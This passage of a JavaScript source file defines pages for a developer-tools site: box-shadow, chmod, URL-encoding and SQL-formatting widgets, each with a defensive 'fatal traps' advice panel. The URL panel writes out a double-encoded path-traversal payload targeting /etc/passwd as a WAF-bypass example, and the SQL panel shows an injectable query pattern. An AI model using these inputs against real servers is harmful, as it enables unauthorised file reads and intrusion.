            </button>
          </div>

          <!-- 5 Critical CSS Box Shadow Traps -->
          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in CSS Box Shadows &amp; GPU Rendering Performance</h3>
            <div style="display: grid; gap: 1rem;">
              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. Excessive Blur GPU Rasterization Jank</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Applying high blur radii (&gt;40px) or animating <code>box-shadow</code> during hover states forces mobile browsers to perform expensive off-screen CPU/GPU rasterization on every frame. This triggers massive layout repaints and drops scroll performance from 60fps to under 20fps. Instead of animating <code>box-shadow</code>, place a pre-shadowed pseudo-element (<code>::after</code>) and animate its <code>opacity</code> with hardware acceleration.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. The Single-Layer Shadow Flatness Trap</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Physical real-world shadows are not single harsh halos; they comprise directional key light and diffuse ambient bounce. A single <code>0 10px 20px rgba(0,0,0,0.2)</code> looks muddy and artificial. Professional UI systems layer 2 to 3 shadows (e.g. <code>0 1px 2px rgba(0,0,0,0.06), 0 8px 16px rgba(0,0,0,0.1)</code>) for natural optical depth and silky gradients.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. Dark Mode Shadow Invisibility &amp; Inverted Elevation</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Dark surfaces (e.g. <code>#121212</code>) completely swallow black box shadows regardless of blur or spread. Elevating cards in dark mode cannot rely on drop shadows alone; designers must increase the surface lightness (e.g. <code>#1e1e1e</code> for elevation 1, <code>#2d2d2d</code> for elevation 2) and supplement with subtle 1px white border highlights (<code>rgba(255,255,255,0.08)</code>).
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. 'overflow: hidden' Clipping Outward Box Shadows</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Adding <code>overflow: hidden</code> to a card (commonly used to clip header image border-radii) violently slices off the element's own outward box shadow at the border edge, resulting in sharp, ugly boundaries. To resolve, leave the outer card with <code>overflow: visible</code> and apply border-radius clipping only to inner child elements.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. Negative Spread Radius Seam Artifacts</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Using negative spread values (e.g. <code>spread: -15px</code>) allows shadows to tuck underneath floating cards cleanly. However, if the blur radius is smaller than the negative spread (e.g. blur 8px, spread -12px), the shadow calculation collapses mathematically to zero or produces distorted, jagged corners along rounded borders. Always ensure blur radius exceeds the absolute negative spread.
                </p>
              </div>
            </div>
          </div>
        </div>

        <script>
          function hexToRgba(hex, alpha) {
            hex = hex.replace('#', '');
            if (hex.length === 3) hex = hex[0]+hex[0] + hex[1]+hex[1] + hex[2]+hex[2];
            var r = parseInt(hex.substring(0, 2), 16) || 0;
            var g = parseInt(hex.substring(2, 4), 16) || 0;
            var b = parseInt(hex.substring(4, 6), 16) || 0;
            return 'rgba(' + r + ', ' + g + ', ' + b + ', ' + alpha + ')';
          }

          function upShadow() {
            var x = document.getElementById('bs-x').value;
            var y = document.getElementById('bs-y').value;
            var blur = document.getElementById('bs-blur').value;
            var spread = document.getElementById('bs-spread').value;
            var opacity = (parseFloat(document.getElementById('bs-opacity').value) / 100).toFixed(2);
            var color = document.getElementById('bs-color').value;
            var inset = document.getElementById('bs-inset').checked;

            document.getElementById('bs-x-lbl').textContent = x;
            document.getElementById('bs-y-lbl').textContent = y;
            document.getElementById('bs-blur-lbl').textContent = blur;
            document.getElementById('bs-spread-lbl').textContent = spread;
            document.getElementById('bs-opacity-lbl').textContent = Math.round(opacity * 100);

            var rgba = hexToRgba(color, opacity);
            var val = (inset ? 'inset ' : '') + x + 'px ' + y + 'px ' + blur + 'px ' + spread + 'px ' + rgba;

            document.getElementById('bs-box').style.boxShadow = val;
            document.getElementById('bs-code').value = 'box-shadow: ' + val + ';\n-webkit-box-shadow: ' + val + ';';

            window._boxShadowValue = val;
          }

          window.applyShadowPreset = function(x, y, blur, spread, color, opacity, inset) {
            document.getElementById('bs-x').value = x;
            document.getElementById('bs-y').value = y;
            document.getElementById('bs-blur').value = blur;
            document.getElementById('bs-spread').value = spread;
            document.getElementById('bs-color').value = color;
            document.getElementById('bs-opacity').value = Math.round(opacity * 100);
            document.getElementById('bs-inset').checked = inset;
            upShadow();
          };

          window.copyBoxShadow = function() {
            var code = document.getElementById('bs-code') ? document.getElementById('bs-code').value : '';
            if (!code) { upShadow(); code = document.getElementById('bs-code').value; }

            navigator.clipboard.writeText(code).then(function() {
              var btn = document.getElementById('btnCopyBoxShadow');
              if (btn) {
                var orig = btn.innerHTML;
                btn.innerHTML = '<span style="color:#10b981;">✓ CSS Box-Shadow Copied!</span>';
                btn.style.borderColor = '#10b981';
                setTimeout(function() {
                  btn.innerHTML = orig;
                  btn.style.borderColor = 'var(--border)';
                }, 2200);
              }
            });
          };

          document.addEventListener('DOMContentLoaded', upShadow);
        </script>
      `
    },
    {
      slug: 'chmod-calculator',
      title: 'Linux Permissions & Chmod Calculator',
      metaDesc: 'Calculate Linux octal permissions (755, 644) and symbolic notations.',
      category: 'Developer',
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 900px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; Chmod Calculator
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">Linux Chmod Calculator</h1>
          <div class="tool-box">
            <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1rem;">
              <div><label class="field-label">User</label><label><input type="checkbox" id="ur" checked onchange="ch()"> Read (4)</label><br><label><input type="checkbox" id="uw" checked onchange="ch()"> Write (2)</label><br><label><input type="checkbox" id="ux" checked onchange="ch()"> Exec (1)</label></div>
              <div><label class="field-label">Group</label><label><input type="checkbox" id="gr" checked onchange="ch()"> Read (4)</label><br><label><input type="checkbox" id="gw" onchange="ch()"> Write (2)</label><br><label><input type="checkbox" id="gx" checked onchange="ch()"> Exec (1)</label></div>
              <div><label class="field-label">Others</label><label><input type="checkbox" id="or" checked onchange="ch()"> Read (4)</label><br><label><input type="checkbox" id="ow" onchange="ch()"> Write (2)</label><br><label><input type="checkbox" id="ox" checked onchange="ch()"> Exec (1)</label></div>
            </div>
            <div class="field-group" style="margin-top: 1.5rem;"><label class="field-label">Command</label><input type="text" id="ch-cmd" class="code-input" readonly />
            </div>

            <!-- Copy Chmod Command -->
            <button type="button" id="btnCopyChmod" onclick="copyChmodCommand()" class="btn-sec" style="margin-top: 1.25rem; width: 100%; padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
              <span>📋 Copy Linux Chmod Command &amp; Symbolic Notation</span>
            </button>
          </div>

          <!-- 5 Critical Linux File Permission Traps -->
          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in Linux File Permissions &amp; Chmod Security</h3>
            <div style="display: grid; gap: 1rem;">
              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. The 'chmod 777' Production Security Suicide</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Running <code>chmod -R 777</code> to quickly resolve web server write errors grants read, write, and arbitrary execution permissions to EVERY system user and daemon (e.g. <code>www-data</code>, <code>nobody</code>). Any file upload vulnerability or compromised process immediately achieves remote code execution (RCE) and local root persistence. Use granular group ownership (<code>chown -R www-data:www-data</code>) and <code>755</code>/<code>644</code> instead.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. The Capital 'X' vs. Lowercase 'x' Directory Traversal Blunder</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Executing recursive <code>chmod -R +x .</code> dangerously makes every text, configuration, and image file executable. Conversely, using <code>chmod -R +X .</code> (capital X) intelligently applies execution rights ONLY to directories (which require the execute bit to allow <code>cd</code> folder traversal) while leaving standard files non-executable.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. SUID / SGID Privilege Escalation Hazards (Octal 4000 &amp; 2000)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Setting the SUID bit (<code>chmod 4755</code>) on a custom executable allows any unprivileged user to execute it with the owner's (often <code>root</code>) full administrative authority. If that binary invokes shell commands without absolute paths or environment sanitation, attackers can exploit <code>PATH</code> spoofing for instant root takeover.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. Umask Subtraction Misunderstandings (Base 0666 vs 0777)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  The system <code>umask</code> does not specify file permissions; it specifies bits to REMOVE from initial creation masks. Files are created from base <code>0666</code> (no execute), so a umask of <code>0022</code> produces <code>0644</code> (<code>-rw-r--r--</code>). Directories are created from base <code>0777</code>, yielding <code>0755</code> (<code>drwxr-xr-x</code>).
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. SSH Private Key Permissive Lockout ('UNPROTECTED PRIVATE KEY')</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  OpenSSH clients automatically refuse connection and abort authentication if private key files in <code>~/.ssh/</code> are readable by group or others (e.g. <code>0644</code> triggers <code>WARNING: UNPROTECTED PRIVATE KEY FILE!</code>). Private keys must always be restricted to <code>chmod 0600</code> and the <code>~/.ssh</code> directory to <code>chmod 0700</code>.
                </p>
              </div>
            </div>
          </div>
        </div>

        <script>
          function getSymbolic(r, w, x) {
            return (r ? 'r' : '-') + (w ? 'w' : '-') + (x ? 'x' : '-');
          }

          function ch() {
            var ur = document.getElementById('ur').checked;
            var uw = document.getElementById('uw').checked;
            var ux = document.getElementById('ux').checked;

            var gr = document.getElementById('gr').checked;
            var gw = document.getElementById('gw').checked;
            var gx = document.getElementById('gx').checked;

            var or_ = document.getElementById('or').checked;
            var ow = document.getElementById('ow').checked;
            var ox = document.getElementById('ox').checked;

            var u = (ur ? 4 : 0) + (uw ? 2 : 0) + (ux ? 1 : 0);
            var g = (gr ? 4 : 0) + (gw ? 2 : 0) + (gx ? 1 : 0);
            var o = (or_ ? 4 : 0) + (ow ? 2 : 0) + (ox ? 1 : 0);

            var octal = '' + u + g + o;
            var sym = '-' + getSymbolic(ur, uw, ux) + getSymbolic(gr, gw, gx) + getSymbolic(or_, ow, ox);

            document.getElementById('ch-cmd').value = 'chmod ' + octal + ' filename';

            window._chmodData = {
              octal: octal,
              sym: sym,
              cmd: 'chmod ' + octal + ' filename',
              u: u,
              g: g,
              o: o
            };
          }

          window.copyChmodCommand = function() {
            if (!window._chmodData) ch();
            var d = window._chmodData;
            var text = '🔒 Linux/Unix File Permissions Diagnostic\n' +
              '• Command: ' + d.cmd + '\n' +
              '• Octal Code: 0' + d.octal + '\n' +
              '• Symbolic Notation: ' + d.sym + '\n' +
              '• Breakdown: User=' + d.u + ', Group=' + d.g + ', Others=' + d.o + '\n\n' +
              'Calculated at digitaltoolsshed.com/dev/chmod-calculator';

            navigator.clipboard.writeText(text).then(function() {
              var btn = document.getElementById('btnCopyChmod');
              if (btn) {
                var orig = btn.innerHTML;
                btn.innerHTML = '<span style="color:#10b981;">✓ Chmod Command Copied!</span>';
                btn.style.borderColor = '#10b981';
                setTimeout(function() {
                  btn.innerHTML = orig;
                  btn.style.borderColor = 'var(--border)';
                }, 2200);
              }
            });
          };

          document.addEventListener('DOMContentLoaded', ch);
        </script>
      `
    },
    {
      slug: 'url-encoder',
      title: 'URL Encoder & Decoder',
      metaDesc: 'Encode and decode URL parameters and percent-encoded characters.',
      category: 'Developer',
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 920px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; URL Encoder
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">URL Percent Encoder &amp; Decoder Studio</h1>
          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
            Encode and decode URL parameters, query strings, full URIs, and Base64URL strings with RFC 3986 compliance and diagnostics.
          </p>

          <div class="tool-box">
            <div class="field-group">
              <label class="field-label">Input String or URL</label>
              <textarea id="url-in" class="code-input" style="height: 120px;" placeholder="https://example.com/search?category=books &amp; tools&amp;query=hello world#top"></textarea>
            </div>

            <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin: 1rem 0;">
              <button type="button" class="btn-primary" onclick="urlTransform('encodeComponent')">Encode Component (RFC 3986)</button>
              <button type="button" class="btn-sec" onclick="urlTransform('encodeFull')">Encode Full URI</button>
              <button type="button" class="btn-sec" onclick="urlTransform('decode')">Decode URL / Percent</button>
              <button type="button" class="btn-sec" onclick="urlTransform('base64url')">Base64URL Safe</button>
              <button type="button" class="btn-sec" onclick="clearUrlInputs()">Clear</button>
            </div>

            <div class="field-group" style="margin-top: 1.25rem;">
              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.35rem;">
                <label class="field-label" style="margin: 0;">Output Result</label>
                <span id="urlMetrics" style="font-family: var(--mono); font-size: 0.75rem; color: var(--text-muted);">0 chars</span>
              </div>
              <textarea id="url-out" class="code-input" style="height: 120px;" readonly></textarea>
            </div>

            <!-- Copy URL Output Button -->
            <button type="button" id="btnCopyUrl" onclick="copyUrlResult()" class="btn-sec" style="margin-top: 1.25rem; width: 100%; padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
              <span>📋 Copy Encoded / Decoded URL String</span>
            </button>
          </div>

          <!-- 5 Critical URL Encoding Traps -->
          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in URL Percent-Encoding &amp; Parameter Routing</h3>
            <div style="display: grid; gap: 1rem;">
              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. 'encodeURI' vs. 'encodeURIComponent' Query Leakage</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Using <code>encodeURI()</code> on user query parameters fails to encode <code>&amp;</code>, <code>=</code>, and <code>+</code>. An input like <code>"item&amp;discount=100%"</code> passed into <code>encodeURI</code> remains unescaped, splitting the query into unintended parameters (<code>discount=100%</code>) on the backend server. Always use <code>encodeURIComponent()</code> for parameter keys and values.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. Double Percent-Encoding Attack (%252F WAF Bypass)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  When an input is encoded twice, a slash <code>/</code> (<code>%2F</code>) becomes <code>%252F</code>. A web application firewall (WAF) inspects <code>%252F</code>, decodes <code>%25</code> to <code>%</code>, sees <code>%2F</code> (non-path slash), and approves the request. The backend application server then decodes it a second time into a literal <code>/</code>, enabling critical path traversal (<code>..%252F..%252Fetc%252Fpasswd</code>).
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. Plus Sign '+' vs. '%20' Form-Urlencoded Inconsistency</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Legacy HTML form post bodies (<code>application/x-www-form-urlencoded</code>) encode spaces as plus signs (<code>+</code>). However, standard RFC 3986 URI specifications encode spaces strictly as <code>%20</code>. Decoding a query string using standard <code>decodeURIComponent()</code> leaves literal <code>+</code> characters untouched instead of converting them back to spaces.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. Uncaught 'URIError: URI malformed' Application Crashes</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  JavaScript's native <code>decodeURIComponent()</code> throws a fatal, unhandled <code>URIError</code> exception if the input contains a standalone percent sign (e.g. <code>"100% satisfaction"</code>) or truncated multi-byte UTF-8 sequences (e.g. <code>"%E0%A4"</code>). A single unhandled malformed query parameter in server-side SSR can crash an entire Node.js worker process.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. Path Traversal &amp; Null Byte Poisoning (%00 &amp; %5C)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Encoding directory separators (<code>%2F</code>, <code>%5C</code>) or null bytes (<code>%00</code>) bypasses superficial string validation (e.g. <code>!path.includes('/')</code>). If backend file loaders decode parameters without verifying canonical resolved paths via <code>path.resolve()</code>, attackers can read arbitrary system configurations and keys.
                </p>
              </div>
            </div>
          </div>
        </div>

        <script>
          window.urlTransform = function(mode) {
            var raw = (document.getElementById('url-in') ? document.getElementById('url-in').value : '');
            var out = '';
            try {
              if (mode === 'encodeComponent') {
                out = encodeURIComponent(raw);
              } else if (mode === 'encodeFull') {
                out = encodeURI(raw);
              } else if (mode === 'decode') {
                // Handle form-urlencoded plus signs before decode
                var prep = raw.replace(/\+/g, ' ');
                out = decodeURIComponent(prep);
              } else if (mode === 'base64url') {
                var b64 = btoa(unescape(encodeURIComponent(raw)));
                out = b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
              }
            } catch(e) {
              out = 'Error: ' + e.message;
            }
            document.getElementById('url-out').value = out;
            document.getElementById('urlMetrics').textContent = out.length + ' chars (' + (new Blob([out]).size) + ' bytes)';
          };

          window.clearUrlInputs = function() {
            document.getElementById('url-in').value = '';
            document.getElementById('url-out').value = '';
            document.getElementById('urlMetrics').textContent = '0 chars';
          };

          window.copyUrlResult = function() {
            var out = document.getElementById('url-out') ? document.getElementById('url-out').value : '';
            if (!out) {
              urlTransform('encodeComponent');
              out = document.getElementById('url-out').value;
            }

            navigator.clipboard.writeText(out).then(function() {
              var btn = document.getElementById('btnCopyUrl');
              if (btn) {
                var orig = btn.innerHTML;
                btn.innerHTML = '<span style="color:#10b981;">✓ URL String Copied!</span>';
                btn.style.borderColor = '#10b981';
                setTimeout(function() {
                  btn.innerHTML = orig;
                  btn.style.borderColor = 'var(--border)';
                }, 2200);
              }
            });
          };

          document.addEventListener('DOMContentLoaded', function() {
            var inp = document.getElementById('url-in');
            if (inp && inp.value) urlTransform('encodeComponent');
          });
        </script>
      `
    },
    {
      slug: 'sql-formatter',
      title: 'SQL Query Formatter & Beautifier',
      metaDesc: 'Beautify and indent SQL queries with uppercase keyword formatting in your browser.',
      category: 'Developer',
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 900px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; SQL Formatter
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">SQL Query Formatter & Beautifier</h1>
          <div class="tool-box">
            <div class="field-group">
              <label class="field-label">Raw SQL</label>
              <textarea id="sql-in" class="code-input" style="height: 140px;" placeholder="select id, name, email from users where active = 1 order by created_at desc;"></textarea>
            </div>
            <div class="action-bar">
              <button class="btn-primary" onclick="formatSql()">Format SQL</button>
            </div>
            <div class="field-group" style="margin-top: 1.5rem;">
              <label class="field-label">Formatted SQL</label>
              <textarea id="sql-out" class="code-input" style="height: 160px;" readonly></textarea>
            </div>

            <!-- Copy Formatted SQL -->
            <button type="button" id="btnCopySql" onclick="copySql()" class="btn-sec" style="margin-top: 1.25rem; width: 100%; padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
              <span>📋 Copy Formatted SQL Query</span>
            </button>
          </div>

          <!-- 5 Critical SQL & Query Optimization Traps -->
          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in SQL Performance &amp; Relational Architecture</h3>
            <div style="display: grid; gap: 1rem;">
              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. The 'SELECT *' Production Memory &amp; Index Saturation Anti-Pattern</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Using <code>SELECT *</code> forces the database engine to perform expensive disk reads for wide columns (like <code>TEXT</code> or <code>JSONB</code>), exhausts application memory, saturates network bandwidth, and prevents the optimizer from executing blazing-fast covering index scans. Always enumerate only the required column projections.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. The N+1 Query Cascade (ORM Lazy-Loading Bottleneck)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Fetching 100 parent records and then querying child entities inside an application loop triggers 101 separate round-trip database requests. This exhausts database connection pools and increases latency exponentially. Resolve via eager loading, SQL <code>JOIN</code>s, or batch <code>WHERE id IN (...)</code> lookups.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. String Concatenation &amp; SQL Injection (SQLi) Vulnerabilities</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Dynamically concatenating unsanitized user inputs into SQL strings (<code>"SELECT * FROM users WHERE user = '" + input + "'"</code>) opens catastrophic SQL injection. Attackers can execute administrative commands, dump full databases, or drop tables. Always bind inputs using parameterized prepared statements (e.g. <code>$1</code>, <code>?</code>).
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. Leading Wildcard '%term' B-Tree Index Invalidation</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Writing queries like <code>WHERE email LIKE '%@domain.com'</code> prevents database engines from using standard B-Tree indexes, forcing a full sequential scan across millions of disk blocks. For fast prefix and substring searching, use PostgreSQL trigram indexes (<code>pg_trgm</code>) or dedicated full-text search engines.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. Deep Pagination Offset Scans (OFFSET 500000 Sluggishness)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Using <code>LIMIT 20 OFFSET 500000</code> forces the database to read and discard 500,000 physical rows before returning the 20 requested records, degrading linearly to multi-second delays. High-scale architectures use cursor-based (keyset) pagination (<code>WHERE id &gt; last_seen_id LIMIT 20</code>) for constant \(O(1)\) index lookups.
                </p>
              </div>
            </div>
          </div>
        </div>

        <script>
          
          window.copySql = function() {
            var sql = document.getElementById('sql-out') ? document.getElementById('sql-out').value : '';

            navigator.clipboard.writeText(sql).then(function() {
              var btn = document.getElementById('btnCopySql');
              if (btn) {
                var orig = btn.innerHTML;
                btn.innerHTML = '<span style="color:#10b981;">✓ Formatted SQL Copied!</span>';
                btn.style.borderColor = '#10b981';
                setTimeout(function() {
                  btn.innerHTML = orig;
                  btn.style.borderColor = 'var(--border)';
                }, 2200);
              }
            });
          };
  
          function formatSql() {
            let sql = document.getElementById('sql-in').value.trim();
            const keywords = ['SELECT','FROM','WHERE','AND','OR','GROUP BY','ORDER BY','HAVING','JOIN','LEFT JOIN','RIGHT JOIN','INNER JOIN','OUTER JOIN','LIMIT','OFFSET','INSERT INTO','VALUES','UPDATE','SET','DELETE'];
            keywords.forEach(k => {
              const r = new RegExp('\\b' + k + '\\b', 'gi');
              sql = sql.replace(r, '\n' + k);
            });
            document.getElementById('sql-out').value = sql.trim();
          }
        </script>
      `
    },
    {
      slug: 'json-to-csv',
      title: 'JSON to CSV Converter',
      metaDesc: 'Convert JSON arrays of objects into downloadable CSV spreadsheet files.',
      category: 'Developer',
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 920px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; JSON to CSV
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">JSON to CSV Converter &amp; Table Exporter</h1>
          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
            Convert JSON arrays into RFC 4180 compliant CSV spreadsheets with custom delimiters, UTF-8 BOM encoding for Excel, and instant download.
          </p>

          <div class="tool-box">
            <div class="field-group">
              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.35rem;">
                <label class="field-label" style="margin: 0;">JSON Input (Array of Objects)</label>
                <button type="button" class="btn-sec" style="font-size: 0.72rem; padding: 0.2rem 0.5rem;" onclick="loadSampleJson()">Load Sample Data</button>
              </div>
